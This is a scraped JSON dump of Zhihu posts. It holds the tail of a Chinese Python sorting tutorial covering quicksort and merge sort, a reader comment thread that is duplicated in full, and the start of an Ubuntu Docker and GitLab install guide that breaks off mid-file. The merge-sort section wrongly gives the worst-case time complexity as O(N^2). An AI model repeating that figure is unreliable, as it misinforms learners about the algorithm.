class=\"n\">first</span> <span class=\"o\">+</span> <span class=\"mi\">1</span>\n    <span class=\"n\">rightmark</span> <span class=\"o\">=</span> <span class=\"n\">last</span>\n\n    <span class=\"n\">done</span> <span class=\"o\">=</span> <span class=\"bp\">False</span>\n    <span class=\"k\">while</span> <span class=\"ow\">not</span> <span class=\"n\">done</span><span class=\"p\">:</span>\n        <span class=\"k\">while</span> <span class=\"n\">leftmark</span> <span class=\"o\">&lt;=</span> <span class=\"n\">rightmark</span> <span class=\"ow\">and</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">leftmark</span><span class=\"p\">]</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pivotvalue</span><span class=\"p\">:</span>\n            <span class=\"n\">leftmark</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n        <span class=\"k\">while</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">rightmark</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">pivotvalue</span> <span class=\"ow\">and</span> <span class=\"n\">rightmark</span> <span class=\"o\">&gt;=</span> <span class=\"n\">leftmark</span><span class=\"p\">:</span>\n            <span class=\"n\">rightmark</span> <span class=\"o\">-=</span> <span class=\"mi\">1</span>\n\n        <span class=\"k\">if</span> <span class=\"n\">rightmark</span> <span class=\"o\">&lt;</span> <span class=\"n\">leftmark</span><span class=\"p\">:</span>\n            <span class=\"n\">done</span> <span class=\"o\">=</span> <span class=\"bp\">True</span>\n        <span class=\"k\">else</span><span class=\"p\">:</span>\n            <span class=\"n\">temp</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">leftmark</span><span class=\"p\">]</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">leftmark</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">rightmark</span><span class=\"p\">]</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">rightmark</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">temp</span>\n\n    <span class=\"n\">temp</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">first</span><span class=\"p\">]</span>\n    <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">first</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">rightmark</span><span class=\"p\">]</span>\n    <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">rightmark</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">temp</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">rightmark</span></code></pre></div><h2>可视化</h2><p>下图是以最后一项为枢轴值： </p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-d4e5d0a778dba725091d8317e6bac939_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"214\" data-thumbnail=\"https://pic2.zhimg.com/v2-d4e5d0a778dba725091d8317e6bac939_b.jpg\" class=\"content_image\" width=\"280\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;280&#39; height=&#39;214&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"214\" data-thumbnail=\"https://pic2.zhimg.com/v2-d4e5d0a778dba725091d8317e6bac939_b.jpg\" class=\"content_image lazy\" width=\"280\" data-actualsrc=\"https://pic2.zhimg.com/v2-d4e5d0a778dba725091d8317e6bac939_b.gif\"/></figure><p> 视频中以第一项为枢轴值：</p><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044983998589603840\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之快速排序\" data-poster=\"https://pic3.zhimg.com/v2-0f89220ce2dd5be676d4c0fa2e877306.jpg\" data-lens-id=\"1044983998589603840\"><img class=\"thumbnail\" src=\"https://pic3.zhimg.com/v2-0f89220ce2dd5be676d4c0fa2e877306.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之快速排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044983998589603840</span></span></a><h2><b>归并排序</b></h2><h2>工作原理</h2><p>归并操作（merge），也叫归并算法，指的是将两个已经排序的序列合并成一个序列的操作。归并排序算法依赖归并操作。 步骤如下：</p><ol><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li><li>重复步骤3直到某一指针到达序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ol><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(N^2)</li><li><b>最优时间复杂度    </b>O(NlogN)</li><li><b>平均时间复杂度    </b>O(NlogN)</li><li><b>额外空间复杂度    </b>O(N)</li><li><b>稳定性</b>    稳定</li></ul><h2>实现</h2><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">merge_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n        <span class=\"n\">mid</span> <span class=\"o\">=</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span> <span class=\"o\">//</span> <span class=\"mi\">2</span>\n        <span class=\"n\">left_half</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[:</span><span class=\"n\">mid</span><span class=\"p\">]</span>\n        <span class=\"n\">right_half</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">mid</span><span class=\"p\">:]</span>\n\n        <span class=\"n\">merge_sort</span><span class=\"p\">(</span><span class=\"n\">left_half</span><span class=\"p\">)</span>\n        <span class=\"n\">merge_sort</span><span class=\"p\">(</span><span class=\"n\">right_half</span><span class=\"p\">)</span>\n\n        <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"k\">while</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">left_half</span><span class=\"p\">)</span> <span class=\"ow\">and</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">right_half</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">left_half</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">&lt;</span> <span class=\"n\">right_half</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]:</span>\n                <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">k</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">left_half</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n                <span class=\"n\">i</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n            <span class=\"k\">else</span><span class=\"p\">:</span>\n                <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">k</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">right_half</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span>\n                <span class=\"n\">j</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n            <span class=\"n\">k</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n        <span class=\"k\">while</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">left_half</span><span class=\"p\">):</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">k</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">left_half</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n            <span class=\"n\">i</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n            <span class=\"n\">k</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n        <span class=\"k\">while</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">right_half</span><span class=\"p\">):</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">k</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">right_half</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span>\n            <span class=\"n\">j</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n            <span class=\"n\">k</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span></code></pre></div><h2>可视化</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-bc5212b7ff693be784265d779ce02c32_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic3.zhimg.com/v2-bc5212b7ff693be784265d779ce02c32_b.jpg\" class=\"content_image\" width=\"280\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;280&#39; height=&#39;237&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic3.zhimg.com/v2-bc5212b7ff693be784265d779ce02c32_b.jpg\" class=\"content_image lazy\" width=\"280\" data-actualsrc=\"https://pic3.zhimg.com/v2-bc5212b7ff693be784265d779ce02c32_b.gif\"/></figure><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044984199215845376\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之归并排序\" data-poster=\"https://pic2.zhimg.com/v2-fe238ee3a7a77f23f3d164698a77c265.jpg\" data-lens-id=\"1044984199215845376\"><img class=\"thumbnail\" src=\"https://pic2.zhimg.com/v2-fe238ee3a7a77f23f3d164698a77c265.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之归并排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044984199215845376</span></span></a><h2><b>小彩蛋</b></h2><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044985740685459456\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"不同的排序算法听起来是什么样的\" data-poster=\"https://pic4.zhimg.com/80/v2-1f1c4f8201813c1b7461a92f5c893cb7_b.jpg\" data-lens-id=\"1044985740685459456\"><img class=\"thumbnail\" src=\"https://pic4.zhimg.com/80/v2-1f1c4f8201813c1b7461a92f5c893cb7_b.jpg\"/><span class=\"content\"><span class=\"title\">不同的排序算法听起来是什么样的<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044985740685459456</span></span></a><h2><b>参考</b></h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中文维基百科</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.youtube.com/user/AlgoRythmics\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">AlgoRythmics - YouTube</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.youtube.com/watch%3Fv%3Dt8g-iYGHpEA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What different sorting algorithms sound like</a></li></ol>", 
            "topic": [
                {
                    "tag": "排序算法", 
                    "tagLink": "https://api.zhihu.com/topics/19622354"
                }, 
                {
                    "tag": "Python", 
                    "tagLink": "https://api.zhihu.com/topics/19552832"
                }
            ], 
            "comments": [
                {
                    "userName": "lishichengyan", 
                    "userLink": "https://www.zhihu.com/people/937c1c3e32387e633a2ceae4a788448f", 
                    "content": "哈哈哈哈哈", 
                    "likes": 4, 
                    "childComments": []
                }, 
                {
                    "userName": "papa森", 
                    "userLink": "https://www.zhihu.com/people/0637851418fe20d464853490189ab8b5", 
                    "content": "厉害，新疆的吗", 
                    "likes": 3, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "哈哈，不是新疆的。平时喜欢街舞，无意间看到这套视频，觉得生动形象就分享出来了。😄", 
                            "likes": 7, 
                            "replyToAuthor": "papa森"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "花里胡哨的", 
                    "likes": 3, 
                    "childComments": []
                }, 
                {
                    "userName": "一叶知秋", 
                    "userLink": "https://www.zhihu.com/people/eced5e7dd3bcf1bb516fb74098c62f44", 
                    "content": "<p>那个跳舞的，我的电脑要是这么慢，妥妥砸了</p>", 
                    "likes": 15, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>哈哈哈，跳得快了该看不明白了</p>", 
                            "likes": 1, 
                            "replyToAuthor": "一叶知秋"
                        }
                    ]
                }, 
                {
                    "userName": "Anonymous", 
                    "userLink": "https://www.zhihu.com/people/971d9d13e15c8a83988fbe72233ffa22", 
                    "content": "这个数组相当皮", 
                    "likes": 5, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "可以可以，这段真的应该放到教学资料里面去", 
                    "likes": 6, 
                    "childComments": [
                        {
                            "userName": "杠精", 
                            "userLink": "https://www.zhihu.com/people/511991a24efc5c7db2830c77e7827e43", 
                            "content": "这个视频之前我们老师讲课时候确实放过～", 
                            "likes": 3, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "森日全", 
                    "userLink": "https://www.zhihu.com/people/8510aefa363d9829b176d71cbea4a351", 
                    "content": "创立了一门新的交叉学科", 
                    "likes": 17, 
                    "childComments": []
                }, 
                {
                    "userName": "白桦树", 
                    "userLink": "https://www.zhihu.com/people/b6feb7ff438099bd43cb758d068d37f2", 
                    "content": "只能说服", 
                    "likes": 2, 
                    "childComments": []
                }, 
                {
                    "userName": "容易道", 
                    "userLink": "https://www.zhihu.com/people/ebe93b2946043eca27ca76bdb453c979", 
                    "content": "有意思", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "容易道", 
                    "userLink": "https://www.zhihu.com/people/ebe93b2946043eca27ca76bdb453c979", 
                    "content": "代码不是写的好，原来得跳的好，哈哈哈", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "夏末.微凉", 
                    "userLink": "https://www.zhihu.com/people/39edccde4e0c9e29db721dbfb7acd98d", 
                    "content": "希尔排序错了吧orz…", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>具体哪里呢？</p>", 
                            "likes": 0, 
                            "replyToAuthor": "夏末.微凉"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "🐮🍺", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "bulu dog", 
                    "userLink": "https://www.zhihu.com/people/c311afe66c652cdf65baf0c645322924", 
                    "content": "哈哈哈哼，年会的表演想好了", 
                    "likes": 7, 
                    "childComments": []
                }, 
                {
                    "userName": "铃舟居士", 
                    "userLink": "https://www.zhihu.com/people/c369f622dd23da10b97ce4220c62d02f", 
                    "content": "<p>数组牛逼！</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p><b>希尔排序 的最优跟最坏时间复杂度写反了吗？</b></p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>多谢指正，已经修改了。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>欢乐透了</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "Fjyyyyy", 
                    "userLink": "https://www.zhihu.com/people/3d3171bd9c35e0ffb7e695d92537c21b", 
                    "content": "<p>快排可以改成用递归写。。这样写是真的长看起来。。。</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "bing han", 
                    "userLink": "https://www.zhihu.com/people/f9e8bace99fdcf83f0c9d2e1496bbb80", 
                    "content": "太棒了", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "三体里面与非门也是这么操作的吗？", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "夕阳红老战士", 
                    "userLink": "https://www.zhihu.com/people/6101602f7d6d6b7871625aeecaddc23c", 
                    "content": "这就是人工智能计算机吧", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "lishichengyan", 
                    "userLink": "https://www.zhihu.com/people/937c1c3e32387e633a2ceae4a788448f", 
                    "content": "哈哈哈哈哈", 
                    "likes": 4, 
                    "childComments": []
                }, 
                {
                    "userName": "papa森", 
                    "userLink": "https://www.zhihu.com/people/0637851418fe20d464853490189ab8b5", 
                    "content": "厉害，新疆的吗", 
                    "likes": 3, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "哈哈，不是新疆的。平时喜欢街舞，无意间看到这套视频，觉得生动形象就分享出来了。😄", 
                            "likes": 7, 
                            "replyToAuthor": "papa森"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "花里胡哨的", 
                    "likes": 3, 
                    "childComments": []
                }, 
                {
                    "userName": "一叶知秋", 
                    "userLink": "https://www.zhihu.com/people/eced5e7dd3bcf1bb516fb74098c62f44", 
                    "content": "<p>那个跳舞的，我的电脑要是这么慢，妥妥砸了</p>", 
                    "likes": 15, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>哈哈哈，跳得快了该看不明白了</p>", 
                            "likes": 1, 
                            "replyToAuthor": "一叶知秋"
                        }
                    ]
                }, 
                {
                    "userName": "Anonymous", 
                    "userLink": "https://www.zhihu.com/people/971d9d13e15c8a83988fbe72233ffa22", 
                    "content": "这个数组相当皮", 
                    "likes": 5, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "可以可以，这段真的应该放到教学资料里面去", 
                    "likes": 6, 
                    "childComments": [
                        {
                            "userName": "杠精", 
                            "userLink": "https://www.zhihu.com/people/511991a24efc5c7db2830c77e7827e43", 
                            "content": "这个视频之前我们老师讲课时候确实放过～", 
                            "likes": 3, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "森日全", 
                    "userLink": "https://www.zhihu.com/people/8510aefa363d9829b176d71cbea4a351", 
                    "content": "创立了一门新的交叉学科", 
                    "likes": 17, 
                    "childComments": []
                }, 
                {
                    "userName": "白桦树", 
                    "userLink": "https://www.zhihu.com/people/b6feb7ff438099bd43cb758d068d37f2", 
                    "content": "只能说服", 
                    "likes": 2, 
                    "childComments": []
                }, 
                {
                    "userName": "容易道", 
                    "userLink": "https://www.zhihu.com/people/ebe93b2946043eca27ca76bdb453c979", 
                    "content": "有意思", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "容易道", 
                    "userLink": "https://www.zhihu.com/people/ebe93b2946043eca27ca76bdb453c979", 
                    "content": "代码不是写的好，原来得跳的好，哈哈哈", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "夏末.微凉", 
                    "userLink": "https://www.zhihu.com/people/39edccde4e0c9e29db721dbfb7acd98d", 
                    "content": "希尔排序错了吧orz…", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>具体哪里呢？</p>", 
                            "likes": 0, 
                            "replyToAuthor": "夏末.微凉"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "🐮🍺", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "bulu dog", 
                    "userLink": "https://www.zhihu.com/people/c311afe66c652cdf65baf0c645322924", 
                    "content": "哈哈哈哼，年会的表演想好了", 
                    "likes": 7, 
                    "childComments": []
                }, 
                {
                    "userName": "铃舟居士", 
                    "userLink": "https://www.zhihu.com/people/c369f622dd23da10b97ce4220c62d02f", 
                    "content": "<p>数组牛逼！</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p><b>希尔排序 的最优跟最坏时间复杂度写反了吗？</b></p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>多谢指正，已经修改了。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>欢乐透了</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "Fjyyyyy", 
                    "userLink": "https://www.zhihu.com/people/3d3171bd9c35e0ffb7e695d92537c21b", 
                    "content": "<p>快排可以改成用递归写。。这样写是真的长看起来。。。</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "bing han", 
                    "userLink": "https://www.zhihu.com/people/f9e8bace99fdcf83f0c9d2e1496bbb80", 
                    "content": "太棒了", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "三体里面与非门也是这么操作的吗？", 
                    "likes": 1, 
                    "childComments": []
                }, 
                {
                    "userName": "夕阳红老战士", 
                    "userLink": "https://www.zhihu.com/people/6101602f7d6d6b7871625aeecaddc23c", 
                    "content": "这就是人工智能计算机吧", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43766407", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 2, 
            "title": "Ubuntu 使用 Docker 安装 Gitlab", 
            "content": "<h2>前言</h2><p>最近帮公司重新搭建了 Gitlab，中间遇到了一些坑，折腾了不少时间，在此记录供大家参考。</p><hr/><h2>正文</h2><h2>安装 Docker CE</h2><h2>卸载旧版本</h2><p>如果有使用旧版本的 Docker （称为 <code>docker</code> 或者 <code>docker-engine</code>），请使用下列命令卸载。</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo apt-get remove docker <span class=\"se\">\\\n</span><span class=\"se\"></span>               docker-engine <span class=\"se\">\\\n</span><span class=\"se\"></span>               docker.io</code></pre></div><h2>安装前准备</h2><h2>Ubuntu 14.04</h2><blockquote>从 Ubuntu 14.04 开始，一部分内核模块移到了可选内核模块包 (linux-image-extra-*) ，以减少内核软件包的体积。正常安装的系统应该会包含可选内核模块包，而一些裁剪后的系统可能会将其精简掉。AUFS 内核驱动属于可选内核模块的一部分，作为推荐的 Docker 存储层驱动，一般建议安装可选内核模块包以使用 AUFS。</blockquote><p>如果系统没有安装可选内核模块的话，可以执行下面的命令来安装可选内核模块包：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo apt-get update\n\n$ sudo apt-get install <span class=\"se\">\\\n</span><span class=\"se\"></span>    linux-image-extra-<span class=\"k\">$(</span>uname -r<span class=\"k\">)</span> <span class=\"se\">\\\n</span><span class=\"se\"></span>    linux-image-extra-virtual</code></pre></div><h2>使用 APT 安装</h2><p>由于 apt 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo apt-get update\n\n$ sudo apt-get install <span class=\"se\">\\\n</span><span class=\"se\"></span>    apt-transport-https <span class=\"se\">\\\n</span><span class=\"se\"></span>    ca-certificates <span class=\"se\">\\\n</span><span class=\"se\"></span>    curl <span class=\"se\">\\\n</span><span class=\"se\"></span>    software-properties-common</code></pre></div><h2>添加国内下载源(官方源在注释中)</h2><p>首先为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg <span class=\"p\">|</span> sudo apt-key add -\n\n\n<span class=\"c1\"># 官方源</span>\n<span class=\"c1\"># $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span></code></pre></div><p>然后，向 source.list 中添加 Docker 软件源：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo add-apt-repository <span class=\"se\">\\\n</span><span class=\"se\"></span>    <span class=\"s2\">&#34;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \\\n</span><span class=\"s2\">    </span><span class=\"k\">$(</span>lsb_release -cs<span class=\"k\">)</span><span class=\"s2\"> \\\n</span><span class=\"s2\">    stable&#34;</span>\n\n\n<span class=\"c1\"># 官方源</span>\n<span class=\"c1\"># $ sudo add-apt-repository \\</span>\n<span class=\"c1\">#    &#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\</span>\n<span class=\"c1\">#    $(lsb_release -cs) \\</span>\n<span class=\"c1\">#    stable&#34;</span></code></pre></div><blockquote>以上命令会添加稳定版本的 Docker CE APT 镜像源，如果需要测试或每日构建版本的 Docker CE 请将 stable 改为 test 或者 nightly。</blockquote><h2>安装 Docker CE</h2><p>更新 apt 软件包缓存，并安装 docker-ce：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo apt-get update\n\n$ sudo apt-get install docker-ce</code></pre></div><h2>使用脚本自动安装</h2><p>同时也可以选择使用下列脚本快速安装：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun</code></pre></div><p>执行脚本自动安装 Docker CE。</p><h2>启动 Docker CE</h2><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo systemctl <span class=\"nb\">enable</span> docker\n$ sudo systemctl start docker</code></pre></div><p>Ubuntu 14.04 请用下列命令启动：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo service docker start</code></pre></div><h2>安装 Gitlab</h2><p>我们使用 <code>sameersbn/gitlab</code> Gitlab 镜像，Github 地址：<a href=\"https://link.zhihu.com/?target=https%3A//github.com/sameersbn/docker-gitlab\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/sameersbn/do</span><span class=\"invisible\">cker-gitlab</span><span class=\"ellipsis\"></span></a>。 首先我们安装 <code>docker-compose</code>：</p><div class=\"highlight\"><pre><code class=\"language-bash\">sudo pip install docker-compose -U</code></pre></div><p>然后下载 <code>sameersbn/gitlab</code> Gitlab 镜像的 <code>docker-compose.yml</code> 文件：</p><div class=\"highlight\"><pre><code class=\"language-bash\">wget https://raw.githubusercontent.com/sameersbn/docker-gitlab/master/docker-compose.yml</code></pre></div><p>然后修改其中的配置，以下是我修改后的版本：</p><div class=\"highlight\"><pre><code class=\"language-yaml\">version<span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s1\">&#39;2&#39;</span><span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\"></span>services<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">  </span>redis<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>restart<span class=\"p\">:</span><span class=\"w\"> </span>always<span class=\"w\">\n</span><span class=\"w\">    </span>image<span class=\"p\">:</span><span class=\"w\"> </span>sameersbn/redis<span class=\"p\">:</span><span class=\"m\">4.0</span>.<span class=\"m\">9</span>-<span 